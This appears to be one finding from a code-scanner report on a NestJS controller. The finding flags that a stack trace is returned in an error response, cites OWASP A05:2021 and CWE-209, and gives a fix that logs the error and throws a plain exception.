HIGH  likely  internet  Stack trace leaked in error response  A05:2021
------------------------------------------------------------------------
 src/users/users.controller.ts:37:16

  35 |       throw new InternalServerErrorException({
  36 |         message: 'could not load users',
  37 |         stack: err.stack,
     |                ~~~~~~~~~ leaks internal stack trace to the client
  38 |       })
  39 |     }

 -> fix (NestJS)   Throw the exception without a custom body; let the
                   built-in filter shape the response.
                   this.logger.error(err)
                   throw new InternalServerErrorException()
 -> why            Stack traces expose absolute file paths, dependency
                   versions, and internal call structure — enough to
                   fingerprint the stack and locate other weaknesses.
 i  ref            OWASP A05:2021 | CWE-209 | RULES.md#stack-trace-leak

